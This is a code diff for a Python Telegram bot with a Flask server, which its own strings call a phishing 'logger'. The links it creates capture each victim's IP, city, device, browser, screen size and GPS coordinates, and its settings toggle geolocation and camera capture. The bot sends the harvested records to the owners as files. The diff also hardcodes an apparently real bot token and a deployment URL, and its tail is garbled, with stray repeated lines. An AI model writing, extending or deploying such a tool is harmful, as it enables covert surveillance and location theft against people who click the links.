@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+#измена
 import os
 import json
 import uuid
@@ -11,7 +11,7 @@ from datetime import datetime
 from flask import Flask, request, jsonify
 
 # ============ КОНФИГ ============
-OWNER_IDS = [744709325, 7949152984]  # 👈 Список владельцев
+OWNER_IDS = [744709325, 7949152984]
 BOT_TOKEN = "8988753811:AAGCcjuqQT-m0broYRfqY3NENTpXx7jSyvg"
 BASE_URL = "https://okak-4u9q.onrender.com/"
 FISHING_DATA_FOLDER = "fishing_data"
@@ -85,7 +85,6 @@ def get_links(owner_id=None):
     return settings.get('links', {})
 
 def get_all_links():
-    """Получить все ссылки от всех владельцев"""
     all_links = {}
     for owner_id in OWNER_IDS:
         links = get_links(owner_id)
@@ -98,7 +97,6 @@ def get_all_links():
 
 # ============ ФУНКЦИИ ДЛЯ РАБОТЫ С TELEGRAM API ============
 def send_message(chat_id, text, reply_markup=None):
-    """Отправить сообщение через Telegram API"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         'chat_id': chat_id,
@@ -116,7 +114,6 @@ def send_message(chat_id, text, reply_markup=None):
         return None
 
 def send_photo(chat_id, photo_bytes, caption=""):
-    """Отправить фото через Telegram API"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
     try:
         response = requests.post(
@@ -130,7 +127,6 @@ def send_photo(chat_id, photo_bytes, caption=""):
         return None
 
 def send_document(chat_id, file_path, caption=""):
-    """Отправить файл через Telegram API"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
     try:
         with open(file_path, 'rb') as f:
@@ -145,7 +141,6 @@ def send_document(chat_id, file_path, caption=""):
         return None
 
 def get_updates(offset=None):
-    """Получить обновления от Telegram"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
     payload = {'timeout': 30}
     if offset:
@@ -207,8 +202,8 @@ def back_kb():
     ]}
 
 # ============ ОБРАБОТЧИКИ КОМАНД ============
-user_owner = {}  # {user_id: owner_id}
-waiting_redirect = {}  # {user_id: True}
+user_owner = {}
+waiting_redirect = {}
 
 def handle_start(message):
     user_id = message['from']['id']
@@ -234,8 +229,8 @@ def handle_callback(callback):
         return
     
     data = callback['data']
-    message_id = callback['message']['message_id']
     chat_id = callback['message']['chat']['id']
+    owner_id = user_owner.get(user_id, user_id)
     
     # Переключение профиля
     if data == "switch":
@@ -248,8 +243,6 @@ def handle_callback(callback):
             user_owner[user_id] = uid
             send_message(chat_id, f"✅ Переключено на {uid}", main_kb())
         return
-    
-    owner_id = user_owner.get(user_id, user_id)
     
     # Настройки
     if data == "settings":
@@ -308,6 +301,205 @@ def handle_callback(callback):
     # Список ссылок
     if data == "links":
         links = get_links(owner_id)
+        if not links:
+            send_message(chat_id, f"📋 **Нет созданных ссылок**\n\n👤 Профиль: `{owner_id}`", back_kb())
+            return
+        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
+        for lid, d in links.items():
+            text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
+        send_message(chat_id, text, links_kb(links))
+        return
+    
+    # Статистика
+    if data == "stats":
+        links = get_links(owner_id)
+        total = sum(len(l.get('visits', [])) for l in links.values())
+        
+        countries = {}
+        for l in links.values():
+            for v in l.get('visits', []):
+                country = v.get('country', 'Unknown')
+                countries[country] = countries.get(country, 0) + 1
+        
+        country_text = ""
+        if countries:
+            top = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]
+            country_text = "\n🌍 **Топ стран:**\n"
+            for c, count in top:
+                country_text += f"   • {c}: {count}\n"
+        
+        text = (
+            f"📊 **Статистика**\n"
+            f"👤 Профиль: `{owner_id}`\n\n"
+            f"📌 Всего ссылок: {len(links)}\n"
+            f"👥 Всего переходов: {total}"
+            f"{country_text}"
+        )
+        send_message(chat_id, text, back_kb())
+        return
+    
+    # Работа со ссылкой
+    if data.startswith("link_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        v = len(links.get(lid, {}).get('visits', []))
+        text = (
+            f"🔗 **Ссылка:** `{lid}`\n\n"
+            f"👥 Переходов: {v}\n"
+            f"🔗 URL: `{BASE_URL}l/{lid}`"
+        )
+        send_message(chat_id, text, link_menu_kb(lid))
+        return
+    
+    if data.startswith("copy_"):
+        lid = data.split("_")[1]
+        url = f"{BASE_URL}l/{lid}"
+        send_message(chat_id, f"📋 `{url}`")
+        return
+    
+    if data.startswith("data_"):
+        lid = data.split("_")[1]
+        links = get_links(owner_id)
+        visits = links.get(lid, {}).get('visits', [])
+        if not visits:
+            send_message(chat_id, "📊 Нет данных")
+            return
+        
+        fn = f"data_{lid}_{int(time.time())}.txt"
+        with open(fn, 'w', encoding='utf-8') as f:
+            f.write(f"ДАННЫЕ ССЫЛКИ: {lid}\n")
+            f.write("=" * 50 + "\n\n")
+            f.write(f"Владелец: {owner_id}\n")
+            f.write(f"Всего переходов: {len(visits)}\n\n")
+            for i, v in enumerate(visits, 1):
+                f.write(f"--- ПЕРЕХОД {i} ---\n")
+                f.write(f"Время: {v.get('timestamp', 'Unknown')}\n")
+                f.write(f"IP: {v.get('ip', 'Unknown')}\n")
+                f.write(f"Страна: {v.get('country', 'Unknown')}\n")
+                f.write(f"Город: {v.get('city', 'Unknown')}\n")
+                f.write(f"Устройство: {v.get('device_type', 'Unknown')}\n")
+                f.write(f"ОС: {v.get('os', 'Unknown')}\n")
+                f.write(f"Браузер: {v.get('browser', 'Unknown')}\n")
+                f.write(f"Экран: {v.get('screen', 'Unknown')}\n")
+                f.write(f"GPS: {v.get('gps_lat', 'Unknown')}, {v.get('gps_lon', 'Unknown')}\n")
+                f.write("\n" + "-" * 30 + "\n\n")
+        
+        send_document(chat_id, fn, f"Данные для {lid}")
+        os.remove(fn)
+        return
+    
+    if data.startswith("del_"):
+        lid = data.split("_")[1]
+        if delete_link(lid, owner_id):
+            send_message(chat_id, "✅ Ссылка удалена", back_kb())
+        return
+    
+    if data == "backlinks":
+        links = get_links(owner_id)
+        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
+        for lid, d in links.items():
+            text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
+        send_message(chat_id, text, links_kb(links))
+        return
+    
+    if data == "back":
+        waiting_redirect.pop(user_id, None)
+        text = (
+            f"🎣 **Mikki Mouse Logger**\n\n"
+            f"👤 Активный профиль: `{owner_id}`\n\n"
+            f"💡 Создавай ссылки и собирай данные!"
+        )
+        send_message(chat_id, text, main_kb())
+        return
+
+def handle_settings(chat_id, user_id):
+    owner_id = user_owner.get(user_id, user_id)
+    s = get_settings(owner_id)
+    text = (
+        f"⚙️ **Настройки**\n"
+        f"👤 Профиль: `{owner_id}`\n\n"
+        f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
+        f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
+        f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
+    )
+    send_message(chat_id, text, settings_kb(owner_id))
+
+def handle_message(message):
+    user_id = message['from']['id']
+    if user_id not in OWNER_IDS:
+        return
+    
+    chat_id = message['chat']['id']
+    text = message.get('text', '')
+    
+    if waiting_redirect.get(user_id):
+        if not text.startswith(('http://', 'https://')):
+            send_message(chat_id, "❌ Неверный формат! Нужно http:// или https://")
+            return
+        
+        owner_id = user_owner.get(user_id, user_id)
+        s = get_settings(owner_id)
+        s['redirect'] = text
+        save_settings(s, owner_id)
+        waiting_redirect.pop(user_id, None)
+        send_message(chat_id, f"✅ Редирект установлен: `{text}`", main_kb())
+        return
+    
+    if text == '/start':
+        handle_start(message)
+        return
+
+# ============ ОСНОВНОЙ ЦИКЛ БОТА ============
+def bot_loop():
+    print("🤖 Бот запущен и слушает...")
+    last_update_id = 0
+    
+    while True:
+        try:
+            updates = get_updates(last_update_id + 1 if last_update_id else None)
+            
+            for update in updates:
+                last_update_id = update.get('update_id', 0)
+                
+                if 'message' in update:
+                    handle_message(update['message'])
+                
+                if 'callback_query' in update:
+                    handle_callback(update['callback_query'])
+                    
+        except Exception as e:
+            print(f"Ошибка в цикле бота: {e}")
+            time.sleep(5)
+
+# ============ FLASK ПРИЛОЖЕНИЕ ============
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return "🤖 Mikki Mouse Logger Bot is running!"
+
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    update = request.get_json()
+    if update:
+        if 'message' in update:
+            handle_message(update['message'])
+        if 'callback_query' in update:
+            handle_callback(update['callback_query'])
+    return jsonify({'status': 'ok'})
+
+# ============ ЗАПУСК ============
+if __name__ == "__main__":
+    print("🚀 ЗАПУСК ФИШИНГ БОТА (на requests)")
+    print(f"👤 Владельцы: {OWNER_IDS}")
+    print(f"🌐 Базовый URL: {BASE_URL}")
+    print("=" * 50)
+    
+    bot_thread = threading.Thread(target=bot_loop, daemon=True)
+    bot_thread.start()
+    
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)d)
         if not links:
             send_message(chat_id, f"📋 **Нет созданных ссылок**\n\n👤 Профиль: `{owner_id}`", back_kb())
             return
